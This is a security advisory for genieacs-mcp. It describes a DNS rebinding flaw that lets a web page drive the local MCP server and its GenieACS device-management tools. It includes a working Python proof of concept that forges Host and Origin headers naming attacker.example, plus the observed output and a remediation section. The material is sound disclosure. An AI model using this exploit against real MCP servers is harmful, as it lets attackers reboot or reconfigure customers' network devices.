# [H] genieacs-mcp: DNS rebinding reaches local GenieACS MCP Streamable HTTP transport

## Summary
Severity: High
Advisory: GHSA-cmwv-wf9p-p8wx
CVE: CVE-2026-55637
CWE: CWE-346
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N (CVSS_V4)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-cmwv-wf9p-p8wx
Type: github-advisory

## Affected
- Go: `github.com/geiserx/genieacs-mcp` — affected >=0 <0.3.2

## Details
`genieacs-mcp` exposes a local Streamable HTTP MCP endpoint that accepts attacker-controlled `Host` and `Origin` headers. A malicious web page can use DNS rebinding to route browser requests to a victim's loopback MCP listener while preserving the attacker origin. The server accepts the request, initializes an MCP session, lists GenieACS tools, and can invoke tools against the configured GenieACS NBI without a browser-supplied secret.

The affected package is `genieacs-mcp` version `0.3.1` at commit `4d7d3c74740efb7f3833aadc8a8e9177650eb462`.

The vulnerable transport setup is in `cmd/server/main.go`. When `TRANSPORT` is not `stdio`, the server creates a Streamable HTTP MCP handler:

```go
// cmd/server/main.go:92
httpSrv := server.NewStreamableHTTPServer(s)
addr := os.Getenv("MCP_LISTEN_ADDR")
if addr == "" {
    addr = "127.0.0.1:8080"
}
authToken := os.Getenv("MCP_AUTH_TOKEN")
if authToken == "" && !isLoopbackAddr(addr) {
    log.Fatal("MCP_AUTH_TOKEN is required when MCP_LISTEN_ADDR is not loopback")
}
if authToken != "" {
    mux := http.NewServeMux()
    mux.Handle("/mcp", bearerAuth(httpSrv, authToken))
    log.Printf("GenieACS MCP bridge listening on %s (auth enabled)", addr)
    if err := http.ListenAndServe(addr, mux); err != nil {
        log.Fatalf("server error: %v", err)
    }
} else {
    log.Printf("GenieACS MCP bridge listening on %s", addr)
    if err := httpSrv.Start(addr); err != nil {
        log.Fatalf("server error: %v", err)
    }
}
```

For the default loopback listener, `MCP_AUTH_TOKEN` is not required. The unauthenticated branch calls `httpSrv.Start(addr)` directly. There is no middleware or MCP transport configuration that validates `Host` or `Origin` before `/mcp` handles the request.

The README documents loopback HTTP as the default deployment mode and says `MCP_AUTH_TOKEN` is required only when `MCP_LISTEN_ADDR` is non-loopback:

```text
TRANSPORT: empty = HTTP
MCP_LISTEN_ADDR: 127.0.0.1:8080
MCP_AUTH_TOKEN: empty, required when MCP_LISTEN_ADDR is non-loopback
```

That leaves the browser-origin boundary as the missing control. DNS rebinding is designed to reach loopback listeners from a public web page unless the local server rejects attacker-controlled `Host` and `Origin` values.

## Proof of concept

The following reproduction uses a fake GenieACS NBI with planted CPE data. It proves that attacker-shaped browser-origin headers reach the real MCP handler and that an MCP tool call reaches the configured GenieACS backend.

Start a fake GenieACS NBI:

```bash
python3 - <<'PY'
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import json
import urllib.parse

DEVICE_ID = "00236A-FAKE-CPE-PWNED"

class Handler(BaseHTTPRequestHandler):
    def _json(self, value, status=200):
        data = json.dumps(value, indent=2).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        print("FAKE_ACS_GET", self.path, dict(self.headers), flush=True)
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path.rstrip("/") == "/devices":
            self._json([{
                "_id": DEVICE_ID,
                "_tags": ["poc-owned"],
                "Device": {
                    "DeviceInfo": {
                        "SoftwareVersion": {"_value": "PLANTED-FAKE-FIRMWARE-9.9.9"},
                        "SerialNumber": {"_value": "PLUTO-FAKE-CPE-0001"}
                    },
                    "ManagementServer": {
                        "URL": {"_value": "https://acs-control.example.invalid/cwmp"}
                    }
                }
            }])
            return
        self._json({"error": "not found"}, 404)

    def log_message(self, fmt, *args):
        return

ThreadingHTTPServer(("127.0.0.1", 18083), Handler).serve_forever()
PY
```

In a second terminal, run the affected MCP server:

```bash
git clone https://github.com/GeiserX/genieacs-mcp.git
cd genieacs-mcp
git checkout 4d7d3c74740efb7f3833aadc8a8e9177650eb462

GOCACHE=/tmp/genieacs_mcp_gocache \
GOPATH=/tmp/genieacs_mcp_gopath \
go build -o /tmp/genieacs-mcp ./cmd/server

ACS_URL=http://127.0.0.1:18083 \
MCP_LISTEN_ADDR=127.0.0.1:8083 \
/tmp/genieacs-mcp
```

In a third terminal, send MCP requests with forged browser-origin headers:

```bash
python3 - <<'PY'
import http.client
import json

PORT = 8083
PROTO = "2024-11-05"
ATTACKER_HOST = f"attacker.example:{PORT}"

def parse_rpc(text):
    text = (text or "").strip()
    if text.startswith("{") or text.startswith("["):
        return [json.loads(text)]
    out = []
    for line in text.splitlines():
        line = line.strip()
        if line.startswith("data:"):
            data = line[5:].strip()
            if data and data != "[DONE]":
                out.append(json.loads(data))
    return out

sid = None

def rpc(body):
    global sid
    headers = {
        "Host": ATTACKER_HOST,
        "Origin": "http://" + ATTACKER_HOST,
        "Content-Type": "application/json",
        "Accept": "application/json, text/event-stream",
    }
    if sid:
        headers["Mcp-Session-Id"] = sid
        headers["MCP-Protocol-Version"] = PROTO
    conn = http.client.HTTPConnection("127.0.0.1", PORT, timeout=10)
    conn.request("POST", "/mcp", json.dumps(body), headers)
    res = conn.getresponse()
    raw_headers = dict(res.getheaders())
    if raw_headers.get("Mcp-Session-Id"):
        sid = raw_headers["Mcp-Session-Id"]
    text = res.read().decode("utf-8", "replace")
    conn.close()
    return res.status, parse_rpc(text), text

init_status, init_msgs, init_raw = rpc({
    "jsonrpc": "2.0",
    "id": 1,
    "method": "initialize",
    "params": {
        "protocolVersion": PROTO,
        "capabilities": {},
        "clientInfo": {"name": "genieacs-rebind-check", "version": "1"}
    }
})

notify_status, _, _ = rpc({"jsonrpc": "2.0", "method": "notifications/initialized", "params": {}})

tools_status, tools_msgs, tools_raw = rpc({
    "jsonrpc": "2.0",
    "id": 2,
    "method": "tools/list",
    "params": {}
})

call_status, call_msgs, call_raw = rpc({
    "jsonrpc": "2.0",
    "id": 3,
    "method": "tools/call",
    "params": {
        "name": "get_parameter",
        "arguments": {
            "device_id": "00236A-FAKE-CPE-PWNED",
            "parameter_path": "Device.DeviceInfo.SoftwareVersion,Device.ManagementServer.URL"
        }
    }
})

print("initialize_status", init_status)
print("session_created", bool(sid))
print("initialized_notification_status", notify_status)
print("tools_list_status", tools_status)
print(tools_raw[:1200])
print("get_parameter_status", call_status)
print(call_raw)
PY
```

The MCP request uses attacker-controlled browser-origin headers and no `Authorization` header:

```http
POST /mcp HTTP/1.1
Host: attacker.example:8083
Origin: http://attacker.example:8083
Content-Type: application/json
Accept: application/json, text/event-stream

{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"genieacs-rebind-check","version":"1"}}}
```

Observed output:

```text
initialize_status 200
session_created True
initialized_notification_status 202
tools_list_status 200
```

`tools/list` returns 12 tools, including:

```text
connection_request
delete_task
download_firmware
get_parameter
manage_preset
manage_provision
reboot_device
refresh_parameter
retry_task
search_devices
set_parameter
tag_device
```

The `get_parameter` tool call reaches the fake GenieACS NBI and returns the planted marker:

```text
Cached parameter values: [
  {
    "_id": "00236A-FAKE-CPE-PWNED",
    "_tags": [
      "poc-owned"
    ],
    "Device": {
      "DeviceInfo": {
        "SoftwareVersion": {
          "_value": "PLANTED-FAKE-FIRMWARE-9.9.9"
        },
        "SerialNumber": {
          "_value": "PLUTO-FAKE-CPE-0001"
        }
      },
      "ManagementServer": {
        "URL": {
          "_value": "https://acs-control.example.invalid/cwmp"
        }
      }
    }
  }
]
```

The fake GenieACS NBI also records the backend request from the MCP server:

```text
FAKE_ACS_GET /devices/?projection=Device.DeviceInfo.SoftwareVersion%2CDevice.ManagementServer.URL&query=%7B%22_id%22%3A%2200236A-FAKE-CPE-PWNED%22%7D
```

## Impact

A malicious website can control a victim's local `genieacs-mcp` HTTP server when the victim runs the documented default loopback HTTP mode. The page can initialize MCP, list available tools, and invoke GenieACS operations through the server's configured `ACS_URL`.

In a real deployment, this can expose or modify CPE management state through GenieACS. The exposed tools include device reboot, firmware download task creation, TR-069 parameter changes, preset and provision management, tag changes, connection requests, task deletion, and task retry. Those actions execute with the MCP server's configured GenieACS access.

## Why this is a vulnerability, not intended behavior

- The project treats loopback HTTP as a safety boundary. The README documents `127.0.0.1:8080` as the default HTTP listen address and requires `MCP_AUTH_TOKEN` only for non-loopback listeners.
- DNS rebinding bypasses the loopback-only assumption unless the local HTTP server validates `Host` and `Origin`.
- PR #22 added bearer authentication for non-loopback listeners. It explicitly left loopback listeners unauthenticated for compatibility. That protects direct non-loopback exposure, but it does not protect the browser-origin path into a loopback listener.
- A local trusted MCP client is the intended caller. A public web page is not.

## Remediation

Add Host and Origin validation before the MCP handler accepts any request. For the default loopback mode, allow only local values such as:

```text
Host: 127.0.0.1:8080
Host: localhost:8080
Origin: http://127.0.0.1:8080
Origin: http://localhost:8080
```

Reject unexpected `Host` or `Origin` values before MCP initialization. Treat absent or non-local `Origin` on browser-reachable requests as suspicious unless the request is authenticated.

Also require a bearer token for HTTP transport even on loopback, or make `stdio` the default transport and require an explicit opt-in for unauthenticated loopback HTTP.

## References
- https://github.com/GeiserX/genieacs-mcp/security/advisories/GHSA-cmwv-wf9p-p8wx
- https://github.com/GeiserX/genieacs-mcp/pull/26
- https://github.com/GeiserX/genieacs-mcp/commit/577306d78190622eee97e362b042a69499ef373f
- https://github.com/GeiserX/genieacs-mcp
- https://github.com/GeiserX/genieacs-mcp/releases/tag/v0.3.2
